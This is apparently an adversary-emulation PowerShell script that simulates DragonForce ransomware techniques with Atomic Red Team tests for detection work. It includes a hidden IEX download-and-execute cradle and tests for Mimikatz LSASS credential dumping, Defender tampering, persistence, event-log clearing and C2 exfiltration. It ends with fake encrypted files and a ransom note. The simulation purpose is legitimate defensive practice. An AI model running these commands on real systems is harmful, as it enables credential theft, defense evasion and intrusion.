# This section is taken from https://github.com/skandler/simulate-akira. I wanna thank https://github.com/skandler for inspiring me to simulate ransomware TTPs with Atomic Red Team. Check out his profile to see its amazing work.
Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
# End of section taken from https://github.com/skandler/simulate-akira

# Custom Test - Command and Scripting Interpreter: PowerShell (T1059.001)
# PowerShell is used to download and execute malicious payloads like Cobalt Strike. I simulated the download and the execution of a powershell script using the same command launched by DragonForce.
echo "Test #1 - Command and Scripting Interpreter: PowerShell (T1059.001)"
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/marcopedrinazzi/simulate-dragonforce-ransomware/refs/heads/main/harmless.ps1'))"

# Atomic Test - Inter-Process Communication (T1559)
# I added this technique to simulate the usage of Cobalt Strike
# https://atomicredteam.io/execution/T1559/#atomic-test-1---cobalt-strike-artifact-kit-pipe
# https://atomicredteam.io/execution/T1559/#atomic-test-2---cobalt-strike-lateral-movement-psexec_psh-pipe
# https://atomicredteam.io/execution/T1559/#atomic-test-3---cobalt-strike-ssh-postex_ssh-pipe
# https://atomicredteam.io/execution/T1559/#atomic-test-4---cobalt-strike-post-exploitation-pipe-42-and-later
Invoke-AtomicTest T1559 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1559 -TestNumbers 1
Invoke-AtomicTest T1559 -TestNumbers 2
Invoke-AtomicTest T1559 -TestNumbers 3
Invoke-AtomicTest T1559 -TestNumbers 4

# Atomic Test - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)
# Registry keys are created to ensure malware execution at startup.
# Remember to set the parameters https://atomicredteam.io/privilege-escalation/T1547.001/#atomic-test-1---reg-key-run
Invoke-AtomicTest T1547.001 -TestNumbers 1

# Atomic Test - Create or Modify System Process: Windows Service (T1543.003)
# SystemBC creates services for persistence.
# Remember to set the parameters https://atomicredteam.io/privilege-escalation/T1543.003/#atomic-test-2---service-installation-cmd
Invoke-AtomicTest T1543.003 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1543.003 -TestNumbers 2

# Atomic Test - Impair Defenses: Disable or Modify Tools (T1562.001)
# I added this technique by reading the GROUP-IB blogpost, the reference is "Antivirus features were disabled"
# https://atomicredteam.io/defense-evasion/T1562.001/#atomic-test-16---tamper-with-windows-defender-atp-powershell
Invoke-AtomicTest T1562.001 -TestNumbers 16

# Atomic Test - OS Credential Dumping: LSASS Memory (T1003.001)
# Mimikatz is used to dump credentials from LSASS memory.
# Remember to set the parameters https://atomicredteam.io/credential-access/T1003.001/#atomic-test-6---offline-credential-theft-with-mimikatz
Invoke-AtomicTest T1003.001 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 6

# Atomic Test - System Network Configuration Discovery (T1016)
# Network configuration details are collected by the attackers.
# Remember to set the parameters https://atomicredteam.io/discovery/T1016/#atomic-test-6---adfind---enumerate-active-directory-subnet-objects
Invoke-AtomicTest T1016 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1016 -TestNumbers 6

# Atomic Test - Domain Trust Discovery (T1482)
# ADFind tool is used to gather information on the Active Directory.
# Remember to set the parameters https://atomicredteam.io/discovery/T1482/#atomic-test-5---adfind---enumerate-active-directory-trusts
Invoke-AtomicTest T1482 -TestNumbers 5

# Atomic Test - Remote System Discovery (T1018)
# Network scanner tools are used to discover remote systems.
# Remember to set the parameters https://atomicredteam.io/discovery/T1018/#atomic-test-22---enumerate-remote-hosts-with-netscan
Invoke-AtomicTest T1018 -TestNumbers 22 -GetPrereqs
Invoke-AtomicTest T1018 -TestNumbers 22

# Atomic Test - System Information Discovery (T1082)
# System-specific information is gathered for targeted attacks.
# https://atomicredteam.io/discovery/T1082/#atomic-test-1---system-information-discovery
Invoke-AtomicTest T1082 -TestNumbers 1

# Atomic Test - File and Directory Discovery (T1083)
# Attackers explore directories and files for valuable data.
# https://atomicredteam.io/discovery/T1083/#atomic-test-2---file-and-directory-discovery-powershell
Invoke-AtomicTest T1083 -TestNumbers 2

# Atomic Test - Remote Services: Remote Desktop Protocol (T1021.001)
# RDP is used for lateral movement within the network.
# Remember to set the parameters https://atomicredteam.io/lateral-movement/T1021.001/#atomic-test-1---rdp-to-domaincontroller
Invoke-AtomicTest T1021.001 -TestNumbers 1

# Atomic Test - Application Layer Protocol: Web Protocols (T1071.001)
# C2 communication is established using HTTP.
# https://atomicredteam.io/command-and-control/T1071.001/#atomic-test-1---malicious-user-agents---powershell
Invoke-AtomicTest T1071.001 -TestNumbers 1

# Atomic Test - Exfiltration Over C2 Channel (T1041)
# I added this technique since the blog post by GROUP-IB was talking about data being exiltrated (so I assumed an exiltration through the C2 channel)
# Remember to set the parameters https://atomicredteam.io/exfiltration/T1041/#atomic-test-1---c2-data-exfiltration
Invoke-AtomicTest T1041 -TestNumbers 1

# Atomic Test - Indicator Removal: Clear Windows Event Logs (T1070.001)
# Windows Event Logs are cleared to hinder forensic investigation. (Security, System, Windows PowerShell are the logs that get cleared)
# Remember to set the parameters https://atomicredteam.io/defense-evasion/T1070.001/#atomic-test-1---clear-logs
Invoke-AtomicTest T1070.001 -TestNumbers 1

# Atomic Test - Defacement: Internal Defacement (T1491.001)
# I added this technique since I saw on the blog post by GROUP-IB the change of the wallpaper by the DrangonForce ransomware
# Remember to set the parameters https://atomicredteam.io/impact/T1491.001/#atomic-test-1---replace-desktop-wallpaper
Invoke-AtomicTest T1491.001 -TestNumbers 1

# Custom Test - Data Encrypted for Impact (T1486)
# Adapted from https://github.com/skandler/simulate-akira 
echo "# Custom Test - Data Encrypted for Impact (T1486)"
1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("$env:USERPROFILE\Documents\test.$_.dragonforce", $out) }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marcopedrinazzi/simulate-dragonforce-ransomware/refs/heads/main/dragonforce_readme.txt" -OutFile "C:\dragonforce_readme.txt"


